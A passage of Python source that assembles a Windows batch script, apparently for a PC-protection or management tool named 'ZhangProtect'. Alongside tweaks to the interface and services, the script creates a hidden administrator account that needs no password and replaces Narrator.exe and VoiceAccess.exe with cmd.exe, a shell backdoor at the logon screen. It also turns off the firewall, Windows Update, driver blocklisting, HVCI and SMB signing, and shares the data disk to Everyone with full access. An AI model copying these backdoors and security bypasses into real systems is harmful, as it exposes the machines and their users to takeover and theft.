                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v fEnableRemoteFXAdvancedRemoteApp /d 1 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v GraphicsProfile /d 3 /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\Client" /t REG_DWORD /v fUsbRedirectionEnableMode /d 1 /f'
                )
                if os.path.isfile(RDP_Display_Cha)
                else ""
            )
            + chr(10)
            + "CHKNTFS/T:0"
            + chr(10)
            + "sc config msiserver start=auto & sc start msiserver"
            + chr(10)
            + "sc config TrustedInstaller start=auto & sc start TrustedInstaller"
            + chr(10)
            + "sc stop EasiUpdate3 & sc config EasiUpdate3 start=disabled"
            + chr(10)
            + "sc stop EasiUpdate & sc config EasiUpdate start=disabled"
            + chr(10)
            + "sc stop EasiUpdate3Protect & sc config EasiUpdate3Protect start=disabled"
            + chr(10)
            + (
                "sc stop Winmgmt & sc config Winmgmt start=disabled"
                if os.path.isfile(disable_Winmgmt)
                else "sc config Winmgmt start=auto & sc start Winmgmt"
            )
            + chr(10)
            + "bcdedit /set disabledynamictick yes"
            + chr(10)
            + 'net user "ZhangProtectAdmin" "Zhang%s" /Add'
            % Unique_identification_code_pwd
            + chr(10)
            + 'net user "ZhangProtectAdmin" "Zhang%s"' % Unique_identification_code_pwd
            + chr(10)
            + 'net user "ZhangProtectAdmin" /active:yes /fullname:"ZhangProtectAdmin" /comment:"该账户为ZhangProtect提供管理维护服务,该设备唯一账户密码为Zhang%s" /workstations:* /passwordreq:no /passwordchg:yes'
            % Unique_identification_code_pwd
            + chr(10)
            + "net localgroup administrators ZhangProtectAdmin /add"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /t REG_DWORD /v ZhangProtectAdmin /d 0 /f'
            + chr(10)
            + 'for %%a in (%datadir%:\\StorageRedirect\\Wlansvc\\*.xml) do netsh wlan add profile filename="%%a" user=all'
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\IconRemover\\SRHIconRemoverForm /t REG_SZ /v DisableHotPlug /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\IconRemover\\SRHIconRemoverForm /t REG_SZ /v Hidethislink1 /d 1 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /t REG_DWORD /v fDisableAutoReconnect /d 0 /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Update /t REG_DWORD /v UpdateMode /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters /t REG_DWORD /v RequireSecuritySignature /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\IconRemover\\SRHIconRemoverForm /t REG_SZ /v RunWithWindows /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Huorong /t REG_DWORD /v ZhangProtectChanged /d 1 /f"
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Huorong\') do (reg add "%%i" /t REG_DWORD /v HideTray /d 1 /f & reg add "%%i" /t REG_DWORD /v AutoRun /d 1 /f & reg add "%%i" /t REG_DWORD /v Message /d 0 /f)'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /t REG_DWORD /v LongPathsEnabled /d 1 /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge /f"
            + chr(10)
            + f'xcopy /Y "{PingFangTTF_dir}\\*.ttf" "%systemroot%\\Fonts\\"'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MicrosoftEdgeElevationService /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdatem /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdate /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + 'for /f "tokens=1 delims=," %%i in (\'schtasks /query /fo csv /NH\') do (echo %%i | findstr "Edge OneDrive" && schtasks /change /disable /tn %%i)'
            + chr(10)
            + 'for /f "tokens=1 delims=," %%i in (\'schtasks /query /fo csv /NH\') do (echo %%i | findstr "Edge OneDrive" && for /f "tokens=9 delims=," %%j in (\'schtasks /Query /TN %%i /V /fo csv /NH\') do (for /f "delims=/" %%k in (\'echo %%~j\') do (del /f /q "%%k" & echo "%%k" > "%%k" & attrib +r "%%k" & icacls "%%k" /setowner SYSTEM /T /C & icacls "%%k" /inheritance:r /deny Everyone:F /T /C)))'
            + chr(10)
            + (("%s /auto" % Timesync_exe) if os.path.isfile(auto_Timesync) else "")
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI /t reg_dword /v FeatureSetState /d 0 /f"
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers /f scaling /t reg_dword /s\') do (reg add "%%i" /t reg_dword /v Scaling /d 3 /f)'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /t reg_dword /v VulnerableDriverBlocklistEnable /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios /t reg_dword /v HypervisorEnforcedCodeIntegrity /d 0 /f"
            + chr(10)
            + 'Taskkill /f /im MasterHelper.exe /t & powershell "Get-Process -Name MasterHelper | Stop-Process -Force"'
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_CURRENT_USER\\Software\\DownloadManager /f "*" /k ^| findstr "[0-9]"\') do (reg delete "%%i" /f)'
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t reg_dword /v TrayIcon /d 3 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /t REG_DWORD /v DisableConfig /d 0 /f'
            + chr(10)
            + 'reg add HKEY_CURRENT_USER\\Software\\DownloadManager /t reg_sz /v Extensions /d "3GP 7Z AAC ACE AI AIF ALZ APK APP ARC ARJ ASF AVI BH BIN BR BUNDLE BZ BZ2 CDA CSV DIF DLL DMG DOC DOCX EGG EPS EXE FLV GZ GZIP IMG IPA ISO ISZ JAR KEXT LHA LZ LZH LZMA M4A M4V MDB MID MKV MOV MP3 MP4 MPA MPE MPEG MPG MSI MSU MUI OGG OGV PDF PKG PPT PPTX PSD PST PUB QT R0* R1* RA RAR RM RMVB RTF SEA SIT SITX SLDM SLDX TAR TBZ TBZ2 TGZ TIF TIFF TLZ TXZ UDF VOB VSD VSDM VSDX VSS VSSM VST VSTM VSTX WAR WAV WBK WIM WKS WMA WMD WMS WMV WMZ WP5 WPD WPS XLS XLSX XPS XZ Z ZIP ZIPX ZPAQ ZSTD CAJ" /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /t REG_DWORD /v SystemRestorePointCreationFrequency /d 1440 /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641} /d CLSID_ThisPCDesktopRegFolder /f"
            + chr(10)
            + (
                (
                    'for /f "delims=" %%i in (\'reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace ^| findstr /vi "B4BFCC3A-DB2C-424C-B029-7FE99A87C641"\') do (reg delete "%%i" /f)'
                    + chr(10)
                    + 'for /f "delims=" %%i in (\'reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace ^| findstr /vi "B4BFCC3A-DB2C-424C-B029-7FE99A87C641"\') do (reg delete "%%i" /f)'
                    + chr(10)
                    + 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" /f'
                    + chr(10)
                    + 'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" /f'
                    + chr(10)
                    + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace ^| findstr /vi "B4BFCC3A-DB2C-424C-B029-7FE99A87C641"\') do (reg delete "%%i" /f)'
                    + chr(10)
                    + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace ^| findstr /vi "B4BFCC3A-DB2C-424C-B029-7FE99A87C641"\') do (reg delete "%%i" /f)'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" /f'
                    + chr(10)
                    + 'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" /f'
                    + chr(10)
                    + 'reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /f'
                    + chr(10)
                    + 'reg delete "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{031E4825-7B94-4dc3-B131-E946B44C8DD5}" /f'
                    + chr(10)
                    + 'reg add "HKEY_CLASSES_ROOT\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /v System.IsPinnedToNameSpaceTree /t REG_DWORD /d 0 /f'
                    + chr(10)
                    + 'reg add "HKEY_CLASSES_ROOT\\CLSID\\{031E4825-7B94-4dc3-B131-E946B44C8DD5}" /v System.IsPinnedToNameSpaceTree /t REG_DWORD /d 0 /f'
                    + chr(10)
                    + 'reg add "HKEY_CLASSES_ROOT\\CLSID\\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}" /v System.IsPinnedToNameSpaceTree /t REG_DWORD /d 0 /f'
                )
                if os.path.isfile(allowIsPinnedToMyPC)
                else "rem 已允许此电脑左侧固定项(Explorer)"
            )
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t reg_dword /v LaunchTo /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PeerlessTimeoutEnabled /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PeerlessTimeout /d 120 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PublicConnectionTimeout /d 60 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge /t REG_DWORD /v PreventFirstRunPage /d 1 /f"
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /f'
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v EnableAutomaticUpdates /t REG_DWORD /d 0 /f'
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v HideUpdateNotifications /t REG_DWORD /d 1 /f'
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v HideEnableDisableUpdates /t REG_DWORD /d 1 /f'
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641} /v HideIfEnabled /f"
            + chr(10)
            + (
                (
                    'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\') do (if /I "%%i" equ "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" (echo) else (reg delete %%i /f))'
                )
                if os.path.isfile(allowIsPinnedToMyPC)
                else "rem 已允许此电脑左侧固定项(Desktop)"
            )
            + chr(10)
            + "sc stop TDNetFilter"
            + chr(10)
            + "net start termservice"
            + chr(10)
            + "NetSh Advfirewall set allprofiles state off"
            + chr(10)
            + (
                (
                    "for /f "
                    + chr(34)
                    + "tokens=2 delims=:"
                    + chr(34)
                    + " %%i in ('powercfg /LIST') do (for /f "
                    + chr(34)
                    + "tokens=1 delims=^("
                    + chr(34)
                    + " %%j in ('echo %%i') do ("
                    + chr(10)
                    + (
                        chr(10).join(
                            [
                                i.replace("[guid]", "%%j")
                                for i in zhang_change_all_powercfg(True)
                            ]
                        )
                    )
                    + chr(10)
                    + "))"
                )
                if os.path.isfile(donotautopower)
                else ""
            )
            + chr(10)
            + (
                "bcdedit /set hypervisorlaunchtype auto"
                if os.path.isfile(need_hyper_v)
                else "bcdedit /set hypervisorlaunchtype off"
            )
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share ProtectDirShare="
            + ProtectDir[:-1]
            + " /unlimited /grant:everyone,read) else (net share ProtectDirShare /delete)"
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share DataDiskShare="
            + datadir
            + ": /unlimited /grant:everyone,full) else (net share DataDiskShare /delete)"
            + chr(10)
            + "if /I %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share SystemDiskShare=%systemdrive% /unlimited /grant:everyone,read) else (net share SystemDiskShare /delete)"
            + chr(10)
            + "net localgroup users "
            + chr(34)
            + "%username%"
            + chr(34)
            + " /add"
            + chr(10)
            + "net localgroup administrators "
            + chr(34)
            + "%username%"
            + chr(34)
            + " /add"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v UpdateServiceUrlAlternate /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUStatusServer /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "sc stop wuauserv"
            + chr(10)
            + "sc config wuauserv start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop UsoSvc"
            + chr(10)
            + "sc config UsoSvc start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop WaaSMedicSvc"
            + chr(10)
            + "sc config WaaSMedicSvc start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop BITS"
            + chr(10)
            + "sc config BITS start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\BITS /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop DoSvc"
            + chr(10)
            + "sc config DoSvc start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DoSvc /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop InstallService"
            + chr(10)
            + "sc config InstallService start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\InstallService /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop edgeupdate"
            + chr(10)
            + "sc config edgeupdate start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdate /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop edgeupdatem"
            + chr(10)
            + "sc config edgeupdatem start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdatem /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "sc stop DiagTrack"
            + chr(10)
            + "sc config DiagTrack start= disabled"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack /t REG_DWORD /v Start /d 4 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DisableOSUpgrade /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeliveryOptimization /v DODownloadMode /t REG_DWORD /d 0 /f"
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Retry Scan" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\USO_UxBroker" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\WindowsUpdate\\sih" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\WaaSMedic\\PerformRemediation" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\InstallService\\ScanForUpdates" /disable'
            + chr(10)
            + 'schtasks /change /tn "\\Microsoft\\Windows\\InstallService\\SmartRetry" /disable'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUShutdownOption /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUAsDefaultShutdownOption /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseFeatureUpdatesStartTime /d "
            + chr(34)
            + "1970-01-01T08:00:00Z"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseQualityUpdatesStartTime /d "
            + chr(34)
            + "1970-01-01T08:00:00Z"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseUpdatesExpiryTime /d "
            + chr(34)
            + "3000-01-01T00:00:00Z"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseFeatureUpdatesEndTime /d "
            + chr(34)
            + "3000-01-01T00:00:00Z"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseQualityUpdatesEndTime /d "
            + chr(34)
            + "3000-01-01T00:00:00Z"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_dword /v FlightSettingsMaxPauseDays /d 65535 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NlaSvc\\Parameters\\Internet /v EnableActiveProbing /t  REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\NetworkConnectivityStatusIndicator /t REG_DWORD /v NoActiveProbe /d 1 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_DWORD /v EnableScripts /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_DWORD /v EnableScripts /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v DisableAcrylicBackgroundOnLogon /t REG_DWORD /d 1 /f'
            + chr(10)
            + 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f'
            + chr(10)
            + 'takeown /f "%systemroot%\\System32\\VoiceAccess.exe" /a & icacls "%systemroot%\\System32\\VoiceAccess.exe" /grant Everyone:F & copy /y "%systemroot%\\System32\\cmd.exe" "%systemroot%\\System32\\VoiceAccess.exe"'
            + chr(10)
            + 'takeown /f "%systemroot%\\System32\\Narrator.exe" /a & icacls "%systemroot%\\System32\\Narrator.exe" /grant Everyone:F /t & copy /y "%systemroot%\\System32\\cmd.exe" "%systemroot%\\System32\\Narrator.exe"'
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control /t REG_SZ /v WaitToKillServiceTimeout /d 1500 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {018D5C66-4533-4307-9B53-224DE2ED1FE6} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {04271989-C4D2-3275-BDC7-29C71C3AC817} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {7AE6DE87-C956-4B40-9C89-3D166C9841D3} /d 1 /f"
            + chr(10)
            + (
                "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 1 /f"
                if os.path.isfile(HideMyPC)
                else "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 0 /f"
            )
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {018D5C66-4533-4307-9B53-224DE2ED1FE6} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {04271989-C4D2-3275-BDC7-29C71C3AC817} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {7AE6DE87-C956-4B40-9C89-3D166C9841D3} /d 1 /f"
            + chr(10)
            + (
                "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 1 /f"
                if os.path.isfile(HideMyPC)
                else "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 0 /f"
            )
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoDriveTypeAutoRun /d 255 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoDriveTypeAutoRun /d 255 /f"
            + chr(10)
